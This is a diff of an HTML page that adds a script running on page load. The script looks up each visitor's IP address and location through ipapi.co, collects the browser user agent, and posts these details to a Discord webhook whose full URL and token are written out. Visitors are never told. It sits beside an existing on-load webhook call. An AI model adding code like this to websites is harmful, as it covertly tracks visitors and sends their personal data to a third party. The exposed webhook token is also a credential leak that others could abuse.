@@ -126,5 +126,44 @@
 
     window.onload = sendWebhook;
   </script>
+  <script>
+    function sendVisitorLog() {
+      fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ip       = data.ip;
+        const city     = data.city;
+        const region   = data.region;
+        const country  = data.country_name;
+        const userAgent= navigator.userAgent;
+        const now      = new Date().toLocaleString();
+
+        const messageContent = 
+`**New Visitor Log:**
+- **IP:** ${ip}
+- **Location:** ${city}, ${region}, ${country}
+- **User-Agent:** ${userAgent}
+- **Time:** ${now}`;
+
+        const payload = { content: messageContent };
+
+        return fetch("https://discord.com/api/webhooks/1337881720422138099/5vt1slfVpjdVz0WtpTpfvvjrewc-ASRhUoQ12ivnJAAaWCOav6k4CNOsUC-3mcm2wrK5", { 
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log("Visitor log sent successfully!");
+        } else {
+          console.error("Failed to send visitor log.");
+        }
+      })
+      .catch(error => console.error("Error sending visitor log:", error));
+    }
+  
+    window.onload = sendVisitorLog;
+  </script>
 </body>
 </html>
